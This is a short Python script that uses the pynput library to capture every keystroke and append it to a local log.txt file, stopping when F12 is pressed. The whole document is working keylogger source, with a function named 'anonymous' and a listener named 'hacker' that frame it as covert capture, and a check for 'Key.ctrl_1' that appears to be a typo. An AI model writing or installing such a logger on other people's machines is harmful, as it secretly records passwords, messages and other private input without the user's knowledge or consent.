from pynput.keyboard import Listener

def anonymous(key):

	key = str(key)
	key = key.replace("'"," ")
	if key == "Key.f12":
		raise SystemExit(0)
	if key == "Key.ctrl_1":
		key =""
	if key == "Key.enter":
		key = "\n"
	with open("log.txt", "a") as file:
		file.write(key)

with Listener(on_press = anonymous) as hacker:
	hacker.join()
